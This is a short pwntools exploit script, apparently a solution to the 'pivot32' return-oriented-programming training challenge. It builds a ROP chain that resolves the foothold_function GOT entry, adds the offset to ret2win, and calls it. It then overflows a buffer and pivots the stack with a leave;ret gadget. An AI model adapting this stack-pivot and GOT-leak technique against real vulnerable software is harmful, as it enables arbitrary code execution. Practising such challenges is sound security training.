from pwn import *

io = process('./pivot32')
elf = ELF('./pivot32')
lib = ELF('./libpivot32.so')

leave_ret = 0x0804889f		# leave ; retn
pop_eax = 0x080488c0			# pop eax ; retn
pop_ebx = 0x08048571			# pop ebx ; retn
mov_eax_eax = 0x080488c4		# mov eax, [eax] ; retn
add_eax_ebx = 0x080488c7		# add eax, ebx ; retn
call_eax = 0x080486a3			# call eax ; 

foothold_plt = elf.plt['foothold_function']		# 0x080485f0
foothold_got = elf.got['foothold_function']		# 0x0804a024
offset = int(lib.sym['ret2win'] - lib.sym['foothold_function'])	# 0x1f7
leakaddr = int(io.recv().split()[20], 16)

def step_1():
	payload_1  = p32(foothold_plt)
	payload_1 += p32(pop_eax)
	payload_1 += p32(foothold_got)
	payload_1 += p32(mov_eax_eax)
	payload_1 += p32(pop_ebx)
	payload_1 += p32(offset)
	payload_1 += p32(add_eax_ebx)
	payload_1 += p32(call_eax)

	io.sendline(payload_1)

def step_2():
	payload_2  = "A" * 40
	payload_2 += p32(leakaddr - 4)	# ebp
	payload_2 += p32(leave_ret)		# mov esp, ebp ; pop ebp ; pop eip

	io.sendline(payload_2)
	io.recvuntil("ROPE")
	print io.recvall()

if __name__=='__main__':
	step_1()
	step_2()
